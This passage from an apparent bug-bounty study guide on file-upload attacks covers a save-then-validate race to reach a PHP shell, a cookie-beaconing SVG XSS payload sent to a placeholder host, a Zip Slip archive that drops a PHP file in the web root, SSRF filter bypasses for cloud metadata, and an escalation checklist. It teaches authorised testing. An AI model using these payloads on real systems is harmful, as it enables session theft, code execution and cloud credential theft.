### Q117. The endpoint returns "file type not allowed" — but only after a ≈3-second pause. What does the delay tell you, and what do you do?
*Diagnosis:* an instant reject is a cheap header/extension check; a **multi-second reject means the server did expensive work first** — it **saved the file, then validated/AV-scanned/re-encoded, then deleted it.** Between *save* and *delete* there is a **TOCTOU race window** where your malicious file is on disk and reachable (§12.3).
*What to do:* **(1)** Upload the marker shell (`me.phtml` with the `GIF89a`+`<?php echo …?>`), even though it'll be "rejected." **(2)** *Simultaneously* hammer parallel GETs to its likely stored URL (Burp Turbo Intruder / xargs curl) during the upload. **(3)** A **200 with the RCE marker** landing *before* the 404 (once it's deleted) = **RCE via the race.** If filenames are randomized, leak the temp path from the response/an error, or use an **LFI + phpinfo temp-file race** to include `/tmp/phpXXXXXX` before PHP deletes it. "The delay *is* the tell — save-then-validate always has a window; I just have to hit the URL inside it."

### Q118. You land an SVG stored-XSS, but it only fires in **your own** profile page (self-XSS). Make it pay.
*Why self-XSS alone is Low:* a payload that only runs in the attacker's own session harms nobody.
*How to promote it:* find a context where **someone else** renders your uploaded SVG. **(1) Admin/staff review:** does a moderator, support agent, or KYC reviewer view uploaded avatars/documents in a panel? If your SVG executes there, it's **privileged stored XSS → admin ATO = Critical** (exfil the admin session/CSRF token). **(2) Shared/public rendering:** is the avatar shown on a public profile, in comments, in a "recent users" widget, or emailed/rendered to others? Any cross-user render turns self-XSS into stored-XSS-to-others. **(3) Overwrite a shared asset:** if you can overwrite a file served to all users (§18), the XSS reaches everyone. *Worked proof:* set the SVG to beacon its origin — `<svg onload="new Image().src='//YOUR.oast.fun/?'+document.domain+';'+document.cookie">` — and if the OOB hit arrives from an **admin/other-user** session context, you've proven cross-user execution. "Self-XSS is a payload looking for an audience — I find the view where a *victim* renders it."

### Q119. Admin panel has "restore from backup (.zip)" that extracts the archive. Walk your path to RCE, safely.
*The tell:* "extract the archive" = the server **trusts the entry names inside your zip.** That's Zip Slip by construction (§17).
*The walk:* **(1)** Build an archive whose entry name traverses out of the extraction dir into the web root, carrying a benign marker shell:
```
entry name:  ../../../../var/www/html/x8-poc.phtml
contents:    GIF89a;\n<?php echo "RCE-POC-".md5("x8bit")."-".php_uname(); ?>
```
(`python3 poc/make_zipslip.py --entry '../../../../var/www/html/x8-poc.phtml' --payload poc/webshell_marker.php`.) **(2)** Upload it through the restore feature. **(3)** Request `https://target/x8-poc.phtml`; the marker line = **RCE.** If `../` is stripped, try `....//`, absolute paths, or a **symlink** entry (tar preserves symlinks) to read/overwrite a trusted file. **(4)** STOP at the marker; delete the dropped file; note it. *Safety:* a unique out-of-the-way filename, benign marker only, no overwrite of real files. "Restore/import/plugin features are usually admin-only, so reaching one is a fast Critical — Zip Slip first, symlink second."

### Q120. "Import from URL" blocks `169.254.169.254` and RFC-1918 ranges. How do you still prove SSRF → cloud metadata?
*The situation:* a naïve allow/deny on the literal string/IP. SSRF filters are notoriously bypassable because the *fetch* resolves and follows differently than the filter checks.
*The bypasses, in order of effort:* **(1) Alternate encodings of the metadata IP** — decimal `http://2852039166/`, octal `http://0251.0254.0169.0254/`, hex `http://0xA9FEA9FE/`, or `http://[::ffff:169.254.169.254]/`. **(2) DNS that resolves to it** — point your own `metadata.attacker.com` A-record at `169.254.169.254` (filter sees a hostname, resolver returns the blocked IP). **(3) DNS rebinding** — a host that passes the filter's first resolution as public, then rebinds to the metadata IP for the actual fetch (TOCTOU on resolution). **(4) Open-redirect / 302 chain** — feed a URL on an *allowed* host that 302-redirects to the metadata endpoint; many fetchers follow redirects without re-filtering. **(5) Cloud-specific hosts** — GCP `metadata.google.internal`, Azure `169.254.169.254` with `Metadata:true`, or the IMDSv2 token dance. *Confirm safely first* with your **OOB listener** (does `url=http://YOUR.oast.fun/` produce a server-side hit? that proves the fetch happens), then swap in the encoded metadata URL. "The block is on the *string*; the fetch happens on the *resolved connection* — I make those two disagree."

---

## APPENDIX — 60-second field checklist
```
[ ] Find ALL uploads + file-consuming features (preview/import/export/url-fetch)
[ ] Fingerprint stack -> what executes?
[ ] Baseline upload -> capture retrieval URL + response Content-Type/Disposition
[ ] Client check?  -> bypass in proxy
[ ] Content-Type check? -> spoof to image/*
[ ] Blacklist? -> .phtml/.phar/.pHp/double-ext/trailing/null/ADS
[ ] Whitelist? -> .htaccess/.user.ini/web.config, magic-byte polyglot, LFI include
[ ] Magic-byte check? -> GIF89a/exiftool prefix
[ ] Re-encoded? -> attack processor (ImageTragick) or change format (PDF/SVG/ZIP/DOCX)
[ ] SVG/XML/Office? -> stored XSS + XXE (file read/SSRF/OOB)
[ ] Archive? -> Zip Slip / symlink / bomb
[ ] Path/filename controllable? -> traversal / overwrite / IDOR on retrieval
[ ] URL-fetch? -> SSRF -> cloud metadata -> keys
[ ] Save-then-validate? -> race (Turbo Intruder)
[ ] No output? -> OOB (interactsh) to confirm blind RCE/SSRF/XXE
[ ] Escalate -> admin-context XSS / webroot shell / cloud takeover ; report with safe PoC
```
*End of guide.*
